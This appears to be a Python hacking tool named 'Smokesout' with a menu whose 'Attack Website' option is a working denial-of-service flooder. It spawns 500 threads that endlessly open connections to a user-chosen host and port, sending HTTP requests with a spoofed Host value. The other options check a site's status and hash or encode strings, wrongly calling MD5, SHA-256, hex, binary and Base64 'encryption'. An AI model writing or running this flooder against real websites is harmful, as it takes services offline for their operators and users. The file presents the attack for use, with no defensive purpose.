import threading
import socket
import time
import urllib.request
from urllib.error import HTTPError
import hashlib
import webbrowser
import base64

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"""{bcolors.FAIL}

 ______  __    __  ______  __  __  ______  ______  ______  __  __  ______  
/\  ___\/\ "-./  \/\  __ \/\ \/ / /\  ___\/\  ___\/\  __ \/\ \/\ \/\__  _\ 
\ \___  \ \ \-./\ \ \ \/\ \ \  _"-\ \  __ \\ \___  \ \ \/\ \ \ \_\ \/_/\ \/ 
 \/\_____\ \_\ \ \_\ \_____\ \_\ \_\ \_____\/\_____\ \_____\ \_____\ \ \_\ 
  \/_____/\/_/  \/_/\/_____/\/_/\/_/\/_____/\/_____/\/_____/\/_____/  \/_/                                                                     
 {bcolors.ENDC}""") #logo
print("""   Beta Version        |       Developed by bloos3rpent

""")

already_connected = 0
def main():
    print(f"""{bcolors.OKBLUE}
    [1] Attack Website
    [2] Check Website Status
    [3] Encrypt String
    
    [99] Exit
    {bcolors.ENDC}""")

    def ddos():
        target = input('target: ')
        port = int(input('port [80 by default]: ') or 80)
        verbose = int(input("Verbose (Does not affect the attack)[200 by default]: ") or 200)
        print("Attacking " + target + " in port " "%s" % (port))
        fake_ip = '182.21.20.32'

        time.sleep(3)
        print(f"{bcolors.OKBLUE}Attack started{bcolors.ENDC}")
        time.sleep(1)
        already_connected = 0

        def attack():
            while 1 > 0:
                try:

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

                    global already_connected
                    already_connected += 1
                    packetssent = str(already_connected)

                    if already_connected % verbose == 0:
                        print(f"{bcolors.OKGREEN}packets sent: {bcolors.ENDC}" + packetssent)
                except (KeyboardInterrupt, SystemExit):
                    main()
                except:
                    print(f"{bcolors.FAIL}Connection Timeout server might be already down or check your internet connection{bcolors.ENDC}")

        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()

    def ping():
        site = input("Check site status: ")
        print("Checking Status: " + site)
        time.sleep(1)

        try:
            status = urllib.request.urlopen("http://" + site).getcode()
            print(f"{bcolors.OKGREEN}Status: %s {bcolors.ENDC}" % (status))
        except urllib.error.HTTPError as err:
            print(f"{bcolors.FAIL} Status: %s {bcolors.ENDC}" % (err.code))
        except:
            print("error")

        main()

    def encrypt():
        print("""
        [1] MD5 Hash
        [2] SHA-256
        [3] 0xHex
        [4] Binary
        [5] Base64
        
        [99] Go Back
        """)
        def ask():
            cipher = input(f"{bcolors.FAIL}Smokesout > {bcolors.ENDC}")
            if cipher == "1": #MD5 HASH
                string = input(f"{bcolors.OKGREEN}Enter String to Hash > {bcolors.ENDC}")
                hash_obj = hashlib.md5(string.encode())
                print("MD5 Encrypted > " + hash_obj.hexdigest())
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    main()
                encrypt()
            elif cipher == "2": #SHA-256
                string = input(f"{bcolors.OKGREEN}Enter String to Hash > {bcolors.ENDC}")
                hash_obj = hashlib.sha256(string.encode())
                print("SHA-256 Encrypted > " + hash_obj.hexdigest())
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    main()
                encrypt()
            elif cipher == "3":
                string = input(f"{bcolors.OKGREEN}Enter String to Encode > {bcolors.ENDC}")
                s = string.encode('utf-8')
                print("0xHex Encoded > " + "0x" + s.hex())
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    main()
                encrypt()
            elif cipher == "4":
                string = input(f"{bcolors.OKGREEN}Enter String to Encode > {bcolors.ENDC}")
                print("Binary Encoded > " + ' '.join(format(ord(x), 'b') for x in string))
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    main()
                encrypt()
            elif cipher == "5":
                message = input(f"{bcolors.OKGREEN}Enter String to Encode > {bcolors.ENDC}")
                message_bytes = message.encode('ascii')
                base64_bytes = base64.b64encode(message_bytes)
                base64_message = base64_bytes.decode('ascii')

                print("Bse64 Encoded > " + base64_message)
                a = input("Encrypt another? (y/n) > ")
                if a.lower() == "y":
                    encrypt()
                else:
                    main()
                encrypt()
            elif cipher == "99":
                main()
            else:
                ask()
        ask()

    def mainask():
        action = input(f"{bcolors.FAIL}Smokesout > {bcolors.ENDC}")
        if action == "1":
            ddos()
        elif action == "2":
            ping()
        elif action == "3":
            encrypt()
        elif action == "99":
            confirm = input("Do you want to exit? y/n: ")
            if confirm.lower() == "y":
                exit()
            else:
                main()
        else:
            mainask()
    mainask()
main()
